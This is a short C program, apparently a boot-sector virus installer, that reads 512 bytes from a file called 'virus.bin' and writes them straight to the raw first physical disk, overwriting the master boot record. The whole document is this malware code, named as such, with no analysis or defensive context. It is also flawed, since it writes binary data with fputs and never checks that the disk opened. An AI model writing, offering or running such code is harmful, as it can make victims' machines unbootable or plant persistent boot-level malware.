#include <stdio.h>
int main(){
    FILE* virus = fopen("virus.bin","rb");
    FILE* first_disk = fopen("\\\\.\\PhysicalDrive0","wb");
    if (virus == NULL){
        printf("virus binary file was not found !\n");
        return 1;
    }
    char new_boot[512];
    fread(new_boot, 512, 1, virus);
    fputs(new_boot,first_disk );
    fclose(virus);
    fclose(first_disk);
    return 0;
}